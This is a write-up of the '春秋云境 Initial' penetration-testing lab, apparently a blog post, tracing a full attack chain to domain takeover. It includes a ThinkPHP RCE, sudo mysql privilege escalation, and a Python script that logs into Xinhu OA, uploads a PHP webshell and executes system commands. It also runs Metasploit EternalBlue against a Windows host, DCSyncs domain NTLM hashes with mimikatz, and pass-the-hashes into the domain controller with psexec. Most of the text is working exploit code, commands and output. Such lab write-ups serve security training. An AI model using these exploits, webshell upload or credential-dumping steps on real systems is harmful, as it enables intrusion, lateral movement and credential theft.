---
typora-root-url: 春秋云境Initial
title: 春秋云境Initial
toc: true
categories:
  - 渗透测试
date: 2026-03-02 22:15:08
tags: 
  - 渗透测试
---

# 春秋云境Initial

fscan扫出漏洞

```
E:\>fscan -h 39.98.118.141
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[801ms]     已选择服务扫描模式
[802ms]     开始信息扫描
[802ms]     最终有效主机数量: 1
[802ms]     开始主机扫描
[802ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[802ms]     有效端口数量: 233
[857ms] [*] 端口开放 39.98.118.141:80
[866ms] [*] 端口开放 39.98.118.141:22
[3.8s]     扫描完成, 发现 2 个开放端口
[3.8s]     存活端口数量: 2
[3.8s]     开始漏洞扫描
[3.8s]     POC加载完成: 总共387个，成功387个，失败0个
[4.1s] [*] 网站标题 http://39.98.118.141      状态码:200 长度:5578   标题:Bootstrap Material Admin
[6.3s] [+] 目标: http://39.98.118.141:80
  漏洞类型: poc-yaml-thinkphp5023-method-rce
  漏洞名称: poc1
  详细信息:
        参考链接:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
[10.0s]     扫描已完成: 3/3
```

## 入口点

thinkphpgui直接利用

蚁剑连接

find找flag失败，估计在root目录

suid提权没找到

![](image-20260302172421688.png)

查看用户sudo权限

![image-20260302172813339](image-20260302172813339.png)

无密码root使用mysql

mysql -e提权

![image-20260302173130123](image-20260302173130123.png)

查看网卡发现其他网卡

fscan传上去扫

![image-20260302173521817](image-20260302173521817.png)

```
172.22.1.18:3306 open
172.22.1.18:445 open
172.22.1.2:445 open
172.22.1.21:445 open
172.22.1.18:139 open
172.22.1.2:139 open
172.22.1.21:139 open
172.22.1.18:135 open
172.22.1.2:135 open
172.22.1.18:80 open
172.22.1.21:135 open
172.22.1.2:88 open
[*] NetInfo 
[*]172.22.1.21
   [->]XIAORANG-WIN7
   [->]172.22.1.21
[*] NetInfo 
[*]172.22.1.2
   [->]DC01
   [->]172.22.1.2
[+] MS17-010 172.22.1.21    (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[*] OsInfo 172.22.1.2    (Windows Server 2016 Datacenter 14393)
[*] NetInfo 
[*]172.22.1.18
   [->]XIAORANG-OA01
   [->]172.22.1.18
[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600
[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login
[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统

172.22.1.18（信呼oa）
172.22.1.15（入口web系统）
172.22.1.21（ms17-010）
172.22.1.2（DC）
```

搭代理

## 信呼oa

看一下版本去搜nday

![image-20260302175333856](image-20260302175333856.png)

![image-20260302180656452](image-20260302180656452.png)

admin:admin123登入

现成poc利用

```
# 1.php为webshell

# 需要修改以下内容：
# url_pre = 'http://<IP>/'
# 'adminuser': '<ADMINUSER_BASE64>',
# 'adminpass': '<ADMINPASS_BASE64>',

import requests

session = requests.session()
url_pre = 'http://<IP>/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
# url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=<ID>'
data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': '<ADMINUSER_BASE64>',
    'adminpass': '<ADMINPASS_BASE64>',
    'yanzm': ''    
}

r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})
filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
print(filepath)
id = r.json()['id']
url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir');")
print(r.text)
```

```
/upload/2026-03/02_18120327.php
 ������ C �еľ�û�б�ǩ��
 �������к��� E0D6-4F4A

 C:\phpStudy\PHPTutorial\WWW\upload\2026-03 ��Ŀ¼

2026/03/02  18:12    <DIR>          .
2026/03/02  18:12    <DIR>          ..
2026/03/02  18:12                29 02_18120327.php
2026/03/02  18:04             3,970 02_rocktpl3881_1.png
2026/03/02  18:04             3,970 02_rocktpl5502_1.png
2026/03/02  18:03             3,970 02_rocktpl8145_1.png
               4 ���ļ�         11,939 �ֽ�
               2 ��Ŀ¼ 23,444,254,720 �����ֽ�
```

蚁剑连接

```
C:\phpStudy\PHPTutorial\WWW\upload\2026-03> type C:\Users\Administrator\flag\f*
C:\Users\Administrator\flag\flag02.txt
 ___    ___ ___  ________  ________  ________  ________  ________   ________     
|\  \  /  /|\  \|\   __  \|\   __  \|\   __  \|\   __  \|\   ___  \|\   ____\    
\ \  \/  / | \  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|    
 \ \    / / \ \  \ \   __  \ \  \\\  \ \   _  _\ \   __  \ \  \\ \  \ \  \  ___  
  /     \/   \ \  \ \  \ \  \ \  \\\  \ \  \\  \\ \  \ \  \ \  \\ \  \ \  \|\  \ 
 /  /\   \    \ \__\ \__\ \__\ \_______\ \__\\ _\\ \__\ \__\ \__\\ \__\ \_______\
/__/ /\ __\    \|__|\|__|\|__|\|_______|\|__|\|__|\|__|\|__|\|__| \|__|\|_______|
|__|/ \|__|                                                                      
flag02: 2ce3-4813-87d4-
Awesome! ! ! You found the second flag, now you can attack the domain controller. 
```

## ms17-010

msf梭哈

```
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                             /basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Win
                                             dows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machin
                                             es.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows
                                              Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 20
                                             08 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.22.156   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts 172.22.1.21
rhosts => 172.22.1.21
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x86/meterpreter/bind_tcp
[-] The value specified for payload is not valid.
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > run

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
<���������������������������������������������������������������������������������������������������Interrupt: use the 'exit' command to quit
meterpreter > shell
Process 652 created.
Channel 1 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32>chcp 65001
chcp 65001
Active code page: 65001
C:\Windows\system32>dir C:\ /S /B|findstr flag
dir C:\ /S /B|findstr flag

```

没flag啥也没有, 应该是给dc当跳板的

## DC

已经是system了，先找domain admin的票据密码hash

```
C:\Windows\system32>klist
klist

Current LogonId is 0:0x3e7

Cached Tickets: (6)

#0>     Client: xiaorang-win7$ @ XIAORANG.LAB
        Server: krbtgt/XIAORANG.LAB @ XIAORANG.LAB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 3/2/2026 17:15:55 (local)
        End Time:   3/3/2026 3:15:54 (local)
        Renew Time: 3/9/2026 17:15:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96


#1>     Client: xiaorang-win7$ @ XIAORANG.LAB
        Server: krbtgt/XIAORANG.LAB @ XIAORANG.LAB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/2/2026 17:15:54 (local)
        End Time:   3/3/2026 3:15:54 (local)
        Renew Time: 3/9/2026 17:15:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96


#2>     Client: xiaorang-win7$ @ XIAORANG.LAB
        Server: ldap/dc01.xiaorang.lab @ XIAORANG.LAB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/2/2026 17:29:54 (local)
        End Time:   3/3/2026 3:15:54 (local)
        Renew Time: 3/9/2026 17:15:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96


#3>     Client: xiaorang-win7$ @ XIAORANG.LAB
        Server: cifs/dc01.xiaorang.lab @ XIAORANG.LAB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/2/2026 17:15:55 (local)
        End Time:   3/3/2026 3:15:54 (local)
        Renew Time: 3/9/2026 17:15:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96


#4>     Client: xiaorang-win7$ @ XIAORANG.LAB
        Server: XIAORANG-WIN7$ @ XIAORANG.LAB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 3/2/2026 17:15:54 (local)
        End Time:   3/3/2026 3:15:54 (local)
        Renew Time: 3/9/2026 17:15:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96


#5>     Client: xiaorang-win7$ @ XIAORANG.LAB
        Server: LDAP/DC01.xiaorang.lab/xiaorang.lab @ XIAORANG.LAB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/2/2026 17:15:54 (local)
        End Time:   3/3/2026 3:15:54 (local)
        Renew Time: 3/9/2026 17:15:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
```

有LDAP票据可以尝试DCSync，这里xiaorang-win7应该是有域管理员权限的，没验证...

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > kiwi_cmd privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > kiwi_cmd privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

meterpreter > kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC01.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514
1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512
1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512
1000    DC01$   bf73577dd7cdb7f83263cc6f9a6d6545        532480
500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512
1104    XIAORANG-OA01$  d9e96633e525274f8b1f07ac47b935f6        4096
1108    XIAORANG-WIN7$  20203e5e1e1466b9fe894ac6eaf0086b        4096
```

psexec

```
E:\exploit\impacket\examples>python psexec.py xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 172.22.1.2.....                                                                                [*] Found writable share ADMIN$
[*] Uploading file MFDEvvFT.exe
[*] Opening SVCManager on 172.22.1.2.....
[*] Creating service gfNB on 172.22.1.2.....
[*] Starting service gfNB.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [�汾 10.0.14393]

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
(c) 2016 Microsoft Corporation����������Ȩ����

chcp 65001
Active code page: 65001
dir C:\ /S /B |findstr flag
C:\Users\Administrator\flag
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag03.txt.lnk
C:\Users\Administrator\flag\flag03.txt
type C:\Users\Administrator\flag\flag03.txt
           ___   ___
 \\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) )
  \  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //
  / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____
 / /\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /
/ /  \\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /


flag03: e8f88d0d43d6}

Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.
```

